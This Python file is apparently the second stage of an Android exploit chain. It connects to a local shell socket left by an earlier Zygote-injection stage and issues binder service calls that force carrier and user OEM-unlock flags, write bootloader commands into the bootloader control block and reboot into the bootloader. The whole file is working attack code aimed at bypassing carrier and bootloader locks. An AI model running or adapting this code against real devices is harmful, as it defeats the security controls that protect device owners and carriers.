import socket
import codecs
import re
import shlex
from typing import Any
from io import BytesIO
from pathlib import Path

import aidl

from .exceptions import *
from .parcel import *


def swap_endianness(bytes_: bytes) -> bytes:
    result = b""
    bytes_io = BytesIO(bytes_)
    while True:
        read_bytes = bytes_io.read(4)
        if not read_bytes:
            break
        result += read_bytes[::-1]
    return result


def parse_service_result(service_result: str) -> tuple[bytes, str]:
    """サービスコール結果をパースし、(データ, エラーメッセージ) を返す"""
    if "Exception" in service_result:
        error_lines = [line for line in service_result.split("\n") if "Exception" in line or "error" in line.lower()]
        return b"", "\n".join(error_lines) if error_lines else service_result

    EXPRESSION = re.compile(
        r"^(?:Result\: Parcel\(|  0x[0-9a-fA-F]+: )((?:[0-9a-fA-F ])+)'[^']*'\)?$"
    )
    matched_any = False
    result = b""
    for line in service_result.split("\n"):
        matched = EXPRESSION.fullmatch(line)
        if matched is None:
            continue
        matched_any = True
        result += codecs.decode(matched[1].replace(" ", ""), "hex")
    if not matched_any:
        return b"", service_result
    return swap_endianness(result), ""


def parse_boolean_result(result: bytes) -> bool:
    if len(result) < 8:
        return False
    status = int.from_bytes(result[:4], "little")
    if status:
        raise Exception("Service returned error status")
    return bool(int.from_bytes(result[4:8], "little"))


# Load AIDL definitions
def load_aidl(filename: str):
    with open(Path(__file__).parent / filename) as f:
        return f.read()


oem_lock_service = parse_aidl_interface(aidl.fromstring(load_aidl("IOemLockService.aidl")), "IOemLockService")
power_service = parse_aidl_interface(aidl.fromstring(load_aidl("IPowerManager.aidl")), "IPowerManager")
recovery_service = parse_aidl_interface(aidl.fromstring(load_aidl("IRecoverySystem.aidl")), "IRecoverySystem")

known_services = {
    "oem_lock": oem_lock_service,
    "power": power_service,
    "recovery": recovery_service,
}


class Stage2Exploit:
    def __init__(self, port: int = 1234):
        self.port = port

    def call_service(self, sock, service_name, function, *args):
        if service_name not in known_services:
            # Raw fallback
            cmd = ["service", "call", service_name, function, *args]
            sock.sendall(shlex.join(cmd).encode() + b"\n")
            resp = sock.recv(10000).decode()
            print(f"[RAW] {service_name} {function}: {resp}")
            return resp

        interface = known_services[service_name]
        func = interface[function]
        parsed = func.parse_arguments(args)
        cmd = ["service", "call", service_name, str(func.code), *parsed]
        full_cmd = shlex.join(cmd)
        print(f"[CMD] {full_cmd}")
        sock.sendall(full_cmd.encode() + b"\n")
        resp = sock.recv(10000).decode()
        print(f"[RESPONSE]\n{resp}")

        raw, error = parse_service_result(resp)
        if error:
            print(f"[ERROR] {error}")
            raise ZygoteInjectionException(f"service call failed: {error}")

        if not raw:
            return None

        ret = func.parse_return(raw)
        status = ret[0]
        if status:
            raise ZygoteInjectionException(f"Service returned error code {status}")
        return ret[1] if len(ret) > 1 else None

    def exploit_stage2(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect(("127.0.0.1", self.port))
            sock.sendall(b"\n")

            # --- OEM unlock (original) ---
            print("=== OEM Unlock ===")
            try:
                carrier = self.call_service(sock, "oem_lock", "isOemUnlockAllowedByCarrier")
                user = self.call_service(sock, "oem_lock", "isOemUnlockAllowedByUser")
                allowed = self.call_service(sock, "oem_lock", "isOemUnlockAllowed")
                if not carrier:
                    print("Carrier lock present, attempting to remove...")
                    self.call_service(sock, "oem_lock", "setOemUnlockAllowedByCarrier", 1)
                    if self.call_service(sock, "oem_lock", "isOemUnlockAllowedByCarrier"):
                        print("*** CARRIER OEM UNLOCK BYPASSED ***")
                if not user:
                    self.call_service(sock, "oem_lock", "setOemUnlockAllowedByUser", 1)
                if not allowed and self.call_service(sock, "oem_lock", "isOemUnlockAllowed"):
                    print("OEM unlock is now allowed!")
                if self.call_service(sock, "oem_lock", "isDeviceOemUnlocked"):
                    print("Bootloader already unlocked.")
            except Exception as e:
                print(f"OEM unlock error: {e}")

            # --- BCB write attempts ---
            print("\n=== BCB Write Attempts ===")

            # 1. IPowerManager.reboot("bootloader")
            print("\n[1] IPowerManager.reboot(\"bootloader\")")
            try:
                self.call_service(sock, "power", "reboot", False, "bootloader", False)
                print("SUCCESS: IPowerManager.reboot called.")
            except Exception as e:
                print(f"FAILED: {e}")

            # 2. IRecoverySystem.setupBcb("bootonce-bootloader")
            print("\n[2] IRecoverySystem.setupBcb(\"bootonce-bootloader\")")
            for cmd in ["bootonce-bootloader", "reboot-bootloader", "bootloader", "fastboot"]:
                try:
                    result = self.call_service(sock, "recovery", "setupBcb", cmd)
                    if result is not None:
                        print(f"  {cmd}: Result={result}")
                    else:
                        print(f"  {cmd}: SUCCESS (void)")
                except Exception as e:
                    print(f"  {cmd}: FAILED - {e}")

            # 3. IRecoverySystem.rebootRecoveryWithCommand("--bootonce-bootloader")
            print("\n[3] IRecoverySystem.rebootRecoveryWithCommand(\"--bootonce-bootloader\")")
            try:
                self.call_service(sock, "recovery", "rebootRecoveryWithCommand", "--bootonce-bootloader")
                print("SUCCESS: rebootRecoveryWithCommand called.")
            except Exception as e:
                print(f"FAILED: {e}")

            # 4. Clear BCB (to see if we can)
            print("\n[4] IRecoverySystem.clearBcb()")
            try:
                result = self.call_service(sock, "recovery", "clearBcb")
                print(f"clearBcb result: {result}")
            except Exception as e:
                print(f"clearBcb failed: {e}")

            # 5. Service existence check
            print("\n[5] Checking service list")
            try:
                sock.sendall(b"service call servicemanager 4 i32 0\n")
                resp = sock.recv(10000).decode()
                if "recovery" in resp:
                    print("recovery service is present.")
                else:
                    print("recovery service NOT found in service list.")
            except Exception as e:
                print(f"Service list check failed: {e}")

            print("\n=== Done ===")


if __name__ == "__main__":
    Stage2Exploit().exploit_stage2()
